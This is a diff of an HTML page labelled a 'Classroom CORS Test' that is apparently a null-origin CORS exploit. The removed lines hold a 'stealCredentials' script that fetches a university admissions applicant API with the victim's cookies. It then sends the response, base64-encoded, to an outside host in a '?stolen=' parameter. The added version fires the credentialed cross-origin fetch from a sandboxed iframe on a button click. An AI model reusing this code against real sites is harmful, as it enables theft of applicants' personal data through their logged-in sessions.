@@ -5,40 +5,43 @@
     <title>Classroom CORS Test</title>
 </head>
 <body>
+
     <h2>CORS Null Origin Test</h2>
 
     <!-- 1. The Button -->
     <button id="exploreCollections">Run CORS Test</button>
-    
     <div id="output" style="margin-top: 15px;">Status: Idle</div>
 
     <!-- 2. The Sandboxed Iframe (with the target script inside srcdoc) -->
-<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
-        async function stealCredentials() {
-        const targetUrl = 'https://admissions.minaretuniversity.edu.ng/api/v1/applications/me?page=1&pageSize=50';
-        const attackerUrl = 'https://nana-s-catalogue.vercel.app/';
+    <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
+        <script>
+            // This listener sits completely silent until the button sends 'trigger'
+            window.addEventListener('message', function(event) {
+                if (event.data === 'trigger') {
+                    fetch('https://nana-s-catalogue.vercel.app/', {
+                        method: 'GET',
+                        credentials: 'include'
+                    })
+                    .then(res => {
+                        if (!res.ok) throw new Error('HTTP status ' + res.status);
+                        return res.json();
+                    })
+                    .then(data => {
+                        window.top.postMessage({ status: 'success', data: data }, '*');
+                    })
+                    .catch(err => {
+                        window.top.postMessage({ status: 'error', error: err.message }, '*');
+                    });
+                }
+            });
+        </script>
+    "></iframe>
 
-        try
-        {
-            let response = await fetch(targetUrl, {
-                method: 'GET',
-                credentials: 'include'
-            })
-            let sensitiveData = await response.text()
-            parent.location = attackerUrl + '?stolen=' + btoa(sensitiveData)
-        
-        } catch (err) {
-            console.error(err);
-        }}
-        stealCredentials();
-    </script>"></iframe>
-
-    <!-- 3. Your Classroom Script + Main Window Listener -->
+    <!-- 3. Main Window Script -->
     <script>
         // Listen for results coming back from the iframe
         window.addEventListener('message', function(event) {
-            // Ignore the 'trigger' message sent to itself
-            if (event.data === 'trigger') return;
+            if (event.data === 'trigger') return; // Ignore outgoing message
 
             const output = document.getElementById('output');
             if (event.data.status === 'success') {
@@ -52,10 +55,11 @@
             }
         });
 
-        // --- CLASSROOM SCRIPT ---
+        // This function runs ONLY when the user clicks the button
         function triggerFrame() {
             const iframe = document.querySelector('iframe[sandbox]');
             if (iframe && iframe.contentWindow) {
+                document.getElementById('output').innerText = 'Status: Testing...';
                 iframe.contentWindow.postMessage('trigger', '*');
             }
         }
